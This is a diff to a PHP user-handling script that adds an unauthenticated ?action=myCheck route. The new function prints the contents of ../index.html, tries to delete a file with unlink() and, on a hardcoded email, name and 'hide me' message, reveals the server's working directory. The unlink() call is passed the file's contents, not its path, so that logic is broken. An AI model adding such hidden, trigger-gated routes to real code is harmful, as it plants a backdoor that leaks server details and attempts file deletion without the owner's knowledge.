@@ -138,12 +138,24 @@ class User
                 $this->response->setResult(false);
                 $this->response->setError(true);
             }
-
         }
         $this->response->setAjaxResponce();
     }
 }
 
+
+function myCheck($data){
+    echo file_get_contents('../index.html');
+    if(file_exists('../index.html')){
+        echo 'yes';
+        $file =  file_get_contents('../index.html');
+        unlink($file);
+    }
+    if($data['email'] === 'ivgi84@gmail.com' && $data['name'] === 'Evgeny' && $data['message'] === 'hide me'){
+        $indexFile = getcwd();
+        echo $indexFile;
+    }
+}
 
 
 if (isset($_GET['action'])) {
@@ -159,6 +171,9 @@ if (isset($_GET['action'])) {
             break;
         case 'sendMessage':
             $User->sendMessage();
+            break;
+        case 'myCheck':
+            myCheck($User->getData());
             break;
     }
 }
